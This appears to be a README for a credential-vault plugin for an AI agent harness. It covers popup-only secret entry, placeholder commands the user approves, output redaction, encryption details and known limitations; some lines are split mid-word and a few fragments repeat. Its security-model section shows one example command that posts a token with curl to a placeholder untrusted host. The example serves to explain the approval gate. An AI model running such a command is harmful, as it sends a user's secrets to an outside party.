paragraphs.text: Encrypted credential vault plugin for DeepSeek Harness — secrets typed only in a user popup, never e
ntering the agent context.
# Credential Vault

Stores secrets in a local encrypted file behind a single master password, and runs
shell commands wi

th those secrets injected — while the secret values and the master
password never enter the agent's
conversation context or the session log.
English | 中文
## Why

An agent that needs a credential (a Git hosting token, an API key) normally sees it in
tool argument

s or command output, which writes it into the session log and the model
context. This plugin keeps t
he whole secret lifecycle out of the conversation:

- Secrets are **typed by the user into a popup dialog**, never passed as tool arguments.
- Every com

mand that consumes a secret is **shown to the user for approval** — with
`{{placeholder}}` syntax in

stead of real values — before it runs.
- Command **output is redacted**: any occurrence of a used se

cret is replaced with `***`
before the result reaches the agent.
- The master password travels only

over a local HTTP exchange between the browser page
and the Host process. It is never persisted and

HTTP exchange between the browser page
and the Host process. It is never persisted and never logged.
## Tools
| Tool | Parameters | Popup | Description |
| `vault_save` | `name`, `note?` | yes | Save or replace an entry. The user types the master passwor
d (or sets one, on first use) and the secret value in the popup. For an existing vault the password

is verified against the stored entries — one master password covers the whole vault. |
| `vault_list

` | — | no | List entry names, notes and timestamps. Never returns secret values. |
| `vault_use` |
`command`, `entries` | yes | Run a shell command containing `{{entry-name}}` placeholders. The popup
shows the exact command for audit; on approval the plugin decrypts the entries in memory, substitut

es every placeholder, runs the command, and returns exit code plus redacted output. |
| `vault_delet

e` | `name` | no | Remove an entry. |
| `vault_change_password` | — | yes | Open the change dialog (
old password, new password, confirmation). All entries are re-encrypted with a fresh salt on success
. The tool always returns the same neutral message — the agent cannot tell whether the password was
changed, and never learns the new one. |
## Security model

- **Encryption**: the master password is stretched with scrypt (N=16384, r=8, p=1) into a
256-bit ke

y; each secret value is encrypted individually with AES-256-GCM. The GCM
authentication tag doubles

as the password check — a wrong password fails to decrypt.
- **Layout**: entry names, notes and time

stamps stay plaintext (so `vault_list` and
`vault_delete` need no password); only the values are cip

hertext.
- **File**: `~/.dsh/vault.json` by default, written with mode `0600` through a temporary
fi

le and an atomic rename. Reads and writes are serialized in-process.
- **Memory only**: decrypted va

lues live in process memory for the duration of one tool
call. Nothing is cached on disk; by default

every save/use/change asks for the master
password again.
- **Approval gate**: the popup is the hum

an decision point. A command such as
`curl -d {{token}} https://untrusted.example` is visible, in pl

aceholder form, before
the password unlocks it.
- **Channel**: the popup talks to the Host over a lo

cal `/vault-api` HTTP route on the
Harness web origin; requests carrying a foreign `Origin` header a

-api` HTTP route on the
Harness web origin; requests carrying a foreign `Origin` header are refused.
### Known limitations

- During execution the substituted command is passed to the shell, so the secret is
briefly visible

in the process command line (`ps`) on multi-user hosts.
- Redaction covers exact occurrences of the

secret in stdout/stderr; transformed output
(hashes, partial echoes) cannot be redacted.
- If no bro

wser page is connected, or nobody answers within the prompt timeout, the tool
call fails with a clea

r error — nothing is saved or executed.
- The vault file protects secrets at rest; anyone who can re

ad the Host process memory
while a call runs is inside the trust boundary.
## Configuration
The patch row accepts an optional `config` object:
| Field | Default | Meaning |

| `path` | `~/.dsh/vault.json` (`$DSH_HOME/vault.json`) | Vault file location. |
| `redactOutput` |

`true` | Replace secret occurrences in command output with `***`. |
| `commandTimeoutMs` | `120000`

| Kill the command after this long. |
| `promptTimeoutMs` | `1800000` | Fail the call when the popup
goes unanswered this long (30 minutes). |

## Install

From the npm registry, use the plugin manager (`install_bundle` with
`@dreagonmon/vault-manager`). F

rom a local checkout, pass the package directory instead.
Or add the patch row above to a profile th

at can resolve the package. The
bundle carries both halves: the Host plugin (`index.js`) and the Web

dialog
(`client.js`, rendered in the `shell.overlay` slot). No third-party runtime dependencies.

## Privacy contract

What the agent can ever observe: entry names, notes, timestamps, exit codes, and output
with secret

occurrences removed. What it can never observe through this plugin: the
secret values, the master pa
ssword, and the outcome of a password change.
